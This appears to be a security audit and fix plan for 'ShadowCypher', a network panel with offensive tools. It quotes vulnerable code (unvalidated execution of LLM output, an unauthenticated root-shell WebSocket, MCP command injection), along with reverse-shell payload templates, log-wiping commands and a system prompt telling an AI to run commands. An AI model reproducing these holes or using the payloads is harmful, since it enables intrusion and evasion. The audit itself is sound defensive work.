# ShadowCypher Deep Dive Analysis & Fix Plan

**Generated:** 2026-03-18
**Analyst:** Sisyphus Deep Analysis
**Codebase Size:** 258KB server.js, 32KB MCP, 31KB intel-ops.js

---

## EXECUTIVE SUMMARY

ShadowCypher is a **network administration panel** with significant offensive security capabilities. The codebase has **multiple critical security vulnerabilities** requiring immediate attention. Most concerning is that the AI chat feature can execute arbitrary commands on the system.

---

## CRITICAL ISSUES (Fix First)

### 🔴 CRITICAL #1: AI Chat Command Injection (server.js ~2100-2150)

**Severity:** CRITICAL - Remote Code Execution

**Finding:**
```javascript
// Lines 2106-2116 - AI extracts commands from LLM output
const mdMatch = msg.content.match(/```(?:bash|sh|console)?\s*([\s\S]*?)\s*```/);
if (mdMatch && mdMatch[1]) {
    cmdToRun = mdMatch[1].trim();
}

// Lines 2123-2129 - Executes WITHOUT validation
try {
    output = await _execPromise(cmdToRun, { timeout: 30000 });
    output = (output.stdout || '') + (output.stderr || '');
} catch (e) { ... }
```

**Impact:** Any authenticated user can prompt the AI to run arbitrary shell commands. If the AI model is manipulated or produces unexpected output, arbitrary code execution occurs.

**Status:** 🔴 NOT FIXED - No input sanitization on LLM-generated commands

---

### 🔴 CRITICAL #2: WebSocket Terminal - No Authentication

**Severity:** CRITICAL - Unauthenticated Shell Access

**Finding (server.js lines 592-611):**
```javascript
const wss = new WebSocket.Server({ server, path: '/ws/terminal' });
wss.on('connection', (ws) => {
    const shell = spawn('script', ['-q', '/dev/null', '-c', 'bash'], {...});
    // NO AUTHENTICATION CHECK
    ws.on('message', msg => { shell.stdin.write(msg); });
});
```

**Impact:** Anyone who can connect to the WebSocket gets a root shell. No session validation, no auth token check.

**Status:** 🔴 NOT FIXED

---

### 🔴 CRITICAL #3: MCP Server Command Injection

**Severity:** CRITICAL - Command Injection via Tool Arguments

**Finding (mcp-server.js lines 450-665):**
```javascript
case 'sqlmap_test': {
    let cmd = 'sqlmap -u ' + args.url;  // No sanitization
    if (args.data) cmd += ' --data "' + args.data + '"';  // Injection point
    ...
}
```

**Impact:** MCP tools accept user-controlled arguments and build shell commands without sanitization. External AI connecting via MCP could inject commands.

**Status:** 🔴 NOT FIXED

---

### 🔴 CRITICAL #4: SSH Command with Plaintext Password

**Severity:** HIGH - Credential Exposure

**Finding (server.js lines 358-365):**
```javascript
function runSSH(cmd, routerConfig) {
    const sshCmd = `sshpass -p '${routerConfig.password}' ssh ...`;
    // Password visible in process list (ps aux)
}
```

**Impact:** Router credentials visible in process list to any local user.

**Status:** 🔴 NOT FIXED

---

## HIGH PRIORITY ISSUES

### 🟠 HIGH #1: /api/exec - Arbitrary Command Execution

**Severity:** HIGH - Limited by requireAuth

**Finding (server.js line 1754-1758):**
```javascript
app.post('/api/exec', requireAuth, async (req, res) => {
    const { cmd } = req.body;
    if (/[`\n\r]|\$\(/.test(cmd)) return res.status(400)... // Basic check only
    const o = await run(cmd);  // Runs as current user
});
```

**Impact:** Authenticated users can run arbitrary commands. Only blocks backticks, newlines, and `$()`.

**Status:** 🟠 PARTIALLY MITIGATED (requires auth)

---

### 🟠 HIGH #2: Pentest API - Offensive Tool Gateway

**Severity:** HIGH - Could be used for network attacks

**Finding (server.js /api/pentest ~2633-2731):**
- nmap, sqlmap, hydra, masscan, aircrack-ng all accessible
- Some tools do target validation, but many do not
- Could be used for unauthorized penetration testing

**Status:** 🟠 PARTIALLY MITIGATED (requires auth, basic target sanitization)

---

### 🟠 HIGH #3: Ghost Mode - System Modification

**Severity:** HIGH - Can modify firewall, MAC, hostname, logs

**Finding (server.js /api/ghost/activate ~2361-2461):**
```javascript
// Modifies iptables, disables IPv6, changes MAC, clears logs
await run('sudo iptables -N GHOST_KILL...');
await run('macchanger -r ' + wiface);
await run('sudo truncate -s 0 /var/log/wtmp...');
```

**Impact:** Compromised auth = full system modification capability.

**Status:** 🟠 ACCEPTED RISK (requires auth, intentional design)

---

### 🟠 HIGH #4: AI System Prompt Injection

**Severity:** MEDIUM-HIGH

**Finding (server.js lines 2038-2046):**
```javascript
currentMessages.unshift({
    role: 'system',
    content: `You are an AI assistant designed for redteaming and hacking. ...
    To execute a command, you MUST output it inside a markdown bash block...`
});
```

**Impact:** System prompt tells AI to execute commands from markdown blocks - this is by design but could be exploited.

**Status:** 🟠 ACCEPTED (intentional design for AI tool use)

---

## MEDIUM PRIORITY ISSUES

### 🟡 MEDIUM #1: No Rate Limiting on Dangerous Endpoints

**Finding:** `/api/pentest`, `/api/exec`, `/api/hacking/*` have no rate limiting.

**Status:** 🟡 NEEDS FIX

---

### 🟡 MEDIUM #2: Session Storage in Memory

**Finding (server.js line 88):**
```javascript
const sessionStore = new session.MemoryStore();
```

**Impact:** Sessions lost on restart, potential memory issues with many sessions.

**Status:** 🟡 NEEDS FIX (consider Redis/DB for production)

---

### 🟡 MEDIUM #3: Intel-ops Browser History Access

**Finding (server.js lines 144-153):**
```javascript
const chromeDb = home + '/.config/google-chrome/Default/History';
const ffCmd = 'find "' + home + '/.mozilla/firefox" ...';
```

**Impact:** Reads browser history databases (requires auth).

**Status:** 🟡 NEEDS WARNING (sensitive data access)

---

### 🟡 MEDIUM #4: Offensive Payload Generation

**Finding (intel-ops.js lines 170-186):**
```javascript
'reverse-bash': 'bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1',
'reverse-php': '<?php $sock=fsockopen("' + lhost + '",' + lport + ')...'
```

**Impact:** Generates reverse shell payloads (by design for pentesting).

**Status:** 🟡 ACCEPTED (pentesting tool)

---

## CODE QUALITY ISSUES

### 📝 Issue #1: Massive Monolith (5379 lines)

**Finding:** server.js is 5379 lines - difficult to maintain.

**Recommendation:** Split into modules:
- `routes/auth.js`
- `routes/network.js`
- `routes/security.js`
- `routes/hacking.js`
- `routes/intel.js`
- `middleware/`
- `lib/`

---

### 📝 Issue #2: Multiple Backup Files

**Finding:**
```
server.js.bak      (97KB)
server.js.broken   (80KB)
server.js.new      (80KB)
```

**Impact:** Exposes development history, security risk if backups contain credentials.

**Recommendation:** Remove all backup files.

---

### 📝 Issue #3: Empty Error Catches

**Finding:** Multiple places with empty catch blocks:
```javascript
} catch(e) {}  // Silently ignores errors
```

**Recommendation:** Log errors or handle gracefully.

---

### 📝 Issue #4: No Input Validation on Many Endpoints

**Finding:** Many endpoints accept user input without validation.

**Recommendation:** Add Joi/Zod schema validation.

---

## RECOMMENDATIONS (Priority Order)

### PHASE 1: Critical Fixes (Do Now)

1. **AI Command Injection Fix**
   - Add validation layer between LLM output and exec
   - Whitelist allowed commands OR
   - Require confirmation before executing AI-generated commands
   - Log all executed commands

2. **WebSocket Auth**
   - Add session validation to WebSocket connections
   - Require auth token in WebSocket handshake

3. **MCP Server Hardening**
   - Add input sanitization for all tool arguments
   - Use parameterized commands where possible
   - Add rate limiting

4. **Remove Backup Files**
   - Delete .bak, .broken, .new files

### PHASE 2: High Priority (This Week)

5. **Rate Limiting**
   - Add rate limiting to `/api/pentest`
   - Add rate limiting to `/api/exec`
   - Add rate limiting to hacking endpoints

6. **Session Security**
   - Consider Redis session store for production
   - Add session rotation on privilege change

7. **Audit Logging**
   - Log all offensive tool usage
   - Log all ghost mode activations
   - Log all exec commands

### PHASE 3: Medium Term (This Month)

8. **Code Refactoring**
   - Split server.js into modules
   - Add Joi validation
   - Add TypeScript

9. **Security Headers**
   - Already implemented (CSP, HSTS) ✓

10. **Dependency Audit**
    - Check for known CVEs in dependencies

---

## FILES ANALYZED

| File | Size | Issues | Status |
|------|------|--------|--------|
| server.js | 258KB (5379 lines) | 12 | NEEDS FIX |
| mcp-server.js | 32KB (747 lines) | 3 | NEEDS FIX |
| intel-ops.js | 31KB (313 lines) | 4 | NEEDS FIX |
| modules/plugin-manager.js | 8KB (246 lines) | 0 | OK |
| modules/session-recorder.js | 5KB (144 lines) | 0 | OK |
| modules/report-generator.js | 7KB (212 lines) | 0 | OK |
| modules/ollama.js | 7KB (225 lines) | 0 | OK |
| public/app.js | 30KB (889+ lines) | 0 | OK |
| desktop/* | Python files | 0 | OK |
| general-plugins/* | 25 plugins | 0 | OK |

---

## SECURITY POSTURE SUMMARY

**Current State:** ⚠️ NEEDS ATTENTION

**Strengths:**
- ✓ Authentication system with 2FA
- ✓ Rate limiting on login
- ✓ Security headers (CSP, HSTS)
- ✓ Session management
- ✓ Input validation on some endpoints

**Weaknesses:**
- ✗ AI can execute arbitrary commands
- ✗ WebSocket terminal unauthenticated
- ✗ MCP server vulnerable to injection
- ✗ No rate limiting on dangerous endpoints
- ✗ No audit logging for offensive tools
- ✗ Backup files expose development history

---

## NEXT STEPS

1. **Immediate:** Fix AI command injection (CRITICAL)
2. **Immediate:** Add WebSocket authentication
3. **This Week:** Add rate limiting, remove backups
4. **This Month:** Refactor server.js, add comprehensive testing
